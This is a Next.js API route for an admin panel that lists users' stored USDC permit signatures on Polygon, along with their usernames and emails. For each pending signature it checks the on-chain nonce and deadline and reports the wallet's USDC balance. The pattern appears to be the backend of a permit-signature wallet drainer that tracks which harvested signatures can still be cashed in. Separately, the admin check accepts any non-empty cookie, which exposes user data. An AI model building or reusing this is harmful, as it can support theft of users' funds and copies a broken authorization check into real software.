import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'
import { cookies } from 'next/headers'
import { createPublicClient, http, parseAbi, formatUnits } from 'viem'
import { polygon } from 'viem/chains'

function getSupabaseAdmin() {
  const url = process.env.NEXT_PUBLIC_SUPABASE_URL
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY
  
  if (!url || !key) {
    return null
  }
  
  return createClient(url, key)
}

// 验证管理员 session
async function verifyAdmin() {
  const cookieStore = await cookies()
  const session = cookieStore.get('admin_session')?.value
  return !!session
}

const CONFIG = {
  rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
  usdcAddress: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' as `0x${string}`,
}

const USDC_ABI = parseAbi([
  'function balanceOf(address account) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
])

export async function GET(request: NextRequest) {
  // 验证管理员
  if (!await verifyAdmin()) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const supabaseAdmin = getSupabaseAdmin()
  if (!supabaseAdmin) {
    return NextResponse.json({ error: 'Database not configured' }, { status: 500 })
  }

  try {
    const { data: signatures, error } = await supabaseAdmin
      .from('permit_signatures')
      .select('*, profiles(username, email)')
      .order('created_at', { ascending: false })

    if (error) {
      console.error('Error fetching signatures:', error)
      return NextResponse.json({ error: 'Database error' }, { status: 500 })
    }

    // 验证签名有效性
    const publicClient = createPublicClient({
      chain: polygon,
      transport: http(CONFIG.rpcUrl),
    })

    const now = Math.floor(Date.now() / 1000)
    
    const signaturesWithValidity = await Promise.all(
      (signatures || []).map(async (sig) => {
        // 已使用或已过期的签名不需要再检查
        if (sig.status !== 'pending') {
          return {
            ...sig,
            is_valid: false,
            invalid_reason: sig.status === 'used' ? 'Already used' : 'Expired/Revoked',
            usdc_balance: '0',
          }
        }

        // 检查 deadline
        if (sig.deadline < now) {
          return {
            ...sig,
            is_valid: false,
            invalid_reason: 'Deadline expired',
            usdc_balance: '0',
          }
        }

        try {
          // 检查链上 nonce
          const currentNonce = await publicClient.readContract({
            address: CONFIG.usdcAddress,
            abi: USDC_ABI,
            functionName: 'nonces',
            args: [sig.owner_address as `0x${string}`],
          })

          if (BigInt(sig.nonce) !== currentNonce) {
            return {
              ...sig,
              is_valid: false,
              invalid_reason: `Nonce mismatch (expected ${sig.nonce}, current ${currentNonce})`,
              usdc_balance: '0',
            }
          }

          // 检查余额
          const balance = await publicClient.readContract({
            address: CONFIG.usdcAddress,
            abi: USDC_ABI,
            functionName: 'balanceOf',
            args: [sig.owner_address as `0x${string}`],
          })

          const balanceFormatted = formatUnits(balance, 6)

          return {
            ...sig,
            is_valid: true,
            invalid_reason: null,
            usdc_balance: balanceFormatted,
          }
        } catch (err) {
          return {
            ...sig,
            is_valid: false,
            invalid_reason: 'Failed to verify on-chain',
            usdc_balance: '0',
          }
        }
      })
    )

    return NextResponse.json({ signatures: signaturesWithValidity })
  } catch (error) {
    console.error('Error:', error)
    return NextResponse.json({ error: 'Internal error' }, { status: 500 })
  }
}
